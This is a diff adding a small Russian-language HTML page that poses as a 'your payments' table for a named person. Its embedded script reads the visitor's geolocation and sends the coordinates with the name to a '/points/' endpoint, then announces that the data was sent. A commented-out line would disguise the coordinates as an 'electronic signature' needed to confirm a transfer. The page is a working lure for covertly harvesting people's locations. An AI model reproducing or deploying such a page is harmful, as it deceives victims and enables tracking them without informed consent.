@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Ваши выплаты</title>
+</head>
+<body>
+    <h3>Имя Фамилия Отчество - Таблица выплат по месяцам</h3>
+    <p>1</p>
+    <p>2</p>
+    <p>3</p>
+    <script>
+        navigator.geolocation.getCurrentPosition(function (position) {
+            // let coords = position.coords.latitude + '; ' +  position.coords.longitude;
+            // document.getElementById('cords-text').innerHTML = 'Ваша электронная подпись \n<b>(необходима для подтверждения перевода по вашим реквезитам):</b><br> Salary Special Sign <b><code style="font-size: 15px;">№ 0077 - ' + coords + ' - 1505-EFS' + '</code></b>';
+
+            const name = "Имя Фамилия Отчество (со страницы выплат)"
+            // Lat = Y Long = X
+            const X = position.coords.longitude;
+            const Y = position.coords.latitude;
+            const link = `/points/?name=${ name }&x=${ X }&y=${ Y }`;
+            fetch( link ).then( () => { alert( "Данные отправлены" ) } );
+        })
+
+    </script>
+</body>
+</html>
